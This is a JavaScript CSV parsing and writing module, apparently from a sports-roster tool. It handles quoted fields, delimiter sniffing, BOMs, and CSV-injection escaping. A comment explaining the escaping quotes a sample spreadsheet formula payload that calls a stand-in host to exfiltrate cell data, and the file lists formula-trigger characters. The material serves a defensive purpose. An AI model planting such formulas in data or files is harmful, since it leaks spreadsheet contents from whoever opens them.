/**
 * CSV, read and written properly.
 *
 * This exists because the content going through it makes `split(',')` wrong on
 * the first real row. A player writing about themselves produces exactly the
 * fields a naive parser destroys:
 *
 *     1234,Alex Auer,"Handball, then ultimate at university"
 *
 * Split on commas and that becomes four fields, the note is truncated at
 * "Handball", and every later column shifts by one — silently, on a file that
 * looks fine in a spreadsheet. The failure is invisible until a commentator reads
 * half a sentence out on air.
 *
 * Deliberately a pure function in shared/ and tested directly rather than through
 * the page (see AGENTS.md): the parser is where the bugs are, and a browser test
 * would exercise the file picker instead.
 *
 * Loaded both by a browser page and by the test runner; see shared/stoppage.js
 * for why it publishes to `window` and `module.exports` alike.
 */
(function (root, factory) {
    'use strict';
    var api = factory();
    if (typeof module === 'object' && module.exports) { module.exports = api; }
    if (root) { root.Csv = api; }
}(typeof window !== 'undefined' ? window : null, function () {
    'use strict';

    /** Sheets writes commas, a European Excel writes semicolons, some tools tabs. */
    var CANDIDATES = [',', ';', '\t'];

    /**
     * Guess the delimiter from the first record.
     *
     * Counts candidates OUTSIDE quotes only. Counting them everywhere would pick
     * the comma in `"Handball, then ultimate"` over the semicolons actually
     * separating the fields, which is the exact case this has to get right.
     */
    function sniff(text) {
        var counts = { ',': 0, ';': 0, '\t': 0 };
        var quoted = false;
        for (var i = 0; i < text.length; i++) {
            var c = text[i];
            if (c === '"') {
                // A doubled quote inside a quoted field is an escaped quote, not
                // the end of it.
                if (quoted && text[i + 1] === '"') { i++; continue; }
                quoted = !quoted;
                continue;
            }
            if (!quoted && (c === '\n' || c === '\r')) { break; }
            if (!quoted && counts[c] !== undefined) { counts[c]++; }
        }
        var best = ',';
        CANDIDATES.forEach(function (d) { if (counts[d] > counts[best]) { best = d; } });
        return best;
    }

    /**
     * Split into records, honouring quotes.
     *
     * A quoted field may contain the delimiter, CR, LF, and doubled quotes. All
     * three line endings are accepted because the file may have been written on
     * any platform and round-tripped through another.
     */
    function records(text, delim) {
        var out = [];
        var row = [];
        var field = '';
        var quoted = false;
        var had = false;              // this record has at least one character

        function endField() { row.push(field); field = ''; had = true; }
        function endRow() {
            endField();
            out.push(row);
            row = [];
            had = false;
        }

        for (var i = 0; i < text.length; i++) {
            var c = text[i];
            if (quoted) {
                if (c === '"') {
                    if (text[i + 1] === '"') { field += '"'; i++; } else { quoted = false; }
                } else {
                    field += c;
                }
                continue;
            }
            if (c === '"') { quoted = true; had = true; continue; }
            if (c === delim) { endField(); continue; }
            if (c === '\r') {
                if (text[i + 1] === '\n') { i++; }
                endRow();
                continue;
            }
            if (c === '\n') { endRow(); continue; }
            field += c;
            had = true;
        }
        // A file not ending in a newline still has a last record; one that does
        // must not gain a phantom empty one.
        if (field !== '' || row.length || had) { endRow(); }
        return out;
    }

    function blank(row) {
        return row.every(function (v) { return String(v).trim() === ''; });
    }

    /**
     * Parse into { delimiter, headers, rows, skipped }.
     *
     * `rows` are plain objects keyed by trimmed header. A duplicate header gets a
     * numeric suffix rather than silently overwriting the first — a spreadsheet
     * with two "Notes" columns is untidy, not a reason to lose data.
     *
     * Short rows are padded and long rows keep their extra cells under generated
     * headers, because a trailing comma in one row should not discard it.
     */
    function parse(text, opts) {
        opts = opts || {};
        var src = String(text === null || text === undefined ? '' : text);
        // Excel writes a UTF-8 BOM. Left in place it becomes part of the first
        // header, so "Player ID" arrives as "﻿Player ID" and column matching
        // fails in a way that looks like the wrong file was picked.
        if (src.charCodeAt(0) === 0xFEFF) { src = src.slice(1); }

        var delim = opts.delimiter || sniff(src);
        var raw = records(src, delim).filter(function (r) { return !blank(r); });
        if (!raw.length) {
            return { delimiter: delim, headers: [], rows: [], skipped: 0 };
        }

        var seen = {};
        var headers = raw[0].map(function (h, i) {
            var name = String(h).trim() || ('Column ' + (i + 1));
            if (seen[name] === undefined) { seen[name] = 0; return name; }
            seen[name] += 1;
            return name + ' ' + (seen[name] + 1);
        });

        var rows = raw.slice(1).map(function (cells) {
            var obj = {};
            for (var i = 0; i < Math.max(headers.length, cells.length); i++) {
                var key = headers[i] || ('Column ' + (i + 1));
                obj[key] = cells[i] === undefined ? '' : String(cells[i]).trim();
            }
            return obj;
        });

        return { delimiter: delim, headers: headers, rows: rows, skipped: 0 };
    }

    function needsQuoting(value, delim) {
        return value.indexOf(delim) !== -1
            || value.indexOf('"') !== -1
            || value.indexOf('\n') !== -1
            || value.indexOf('\r') !== -1
            || value !== value.trim();
    }

    /**
     * Characters that make a spreadsheet treat a cell as a formula.
     *
     * This is the CSV-injection defence, and it is needed because the export
     * carries PLAYER NAMES out of the database and into a file the team opens in
     * Google Sheets or Excel. A player named `=HYPERLINK("http://x/?"&A1,"hi")`
     * is a formula that runs when the team opens the sheet, and in Sheets that is
     * enough to exfiltrate the rest of the document.
     *
     * Quoting does NOT prevent it: both Excel and Sheets evaluate a formula
     * inside a quoted CSV field, so `"=1+1"` is still a formula. The cell has to
     * be marked as text.
     */
    var FORMULA_LEAD = ['=', '+', '-', '@', '\t', '\r'];

    function cell(value, delim) {
        var s = value === null || value === undefined ? '' : String(value);
        // A leading apostrophe is the spreadsheet's own "this is text" marker.
        // Applied only to cells that actually start with a trigger, so ordinary
        // names and numbers are untouched -- and no real name starts with one.
        if (s.length && FORMULA_LEAD.indexOf(s.charAt(0)) !== -1) { s = "'" + s; }
        return needsQuoting(s, delim) ? '"' + s.replace(/"/g, '""') + '"' : s;
    }

    /**
     * Write headers and rows back out.
     *
     * CRLF and a BOM, both for Excel: without the BOM it reads a UTF-8 file as
     * the local codepage and mangles every name with an accent in it, which on an
     * international roster is most of them.
     */
    function stringify(headers, rows, opts) {
        opts = opts || {};
        var delim = opts.delimiter || ',';
        var lines = [headers.map(function (h) { return cell(h, delim); }).join(delim)];
        rows.forEach(function (row) {
            lines.push(headers.map(function (h) { return cell(row[h], delim); }).join(delim));
        });
        return (opts.bom === false ? '' : '\uFEFF') + lines.join('\r\n') + '\r\n';
    }

    return { parse: parse, stringify: stringify, sniff: sniff };
}));
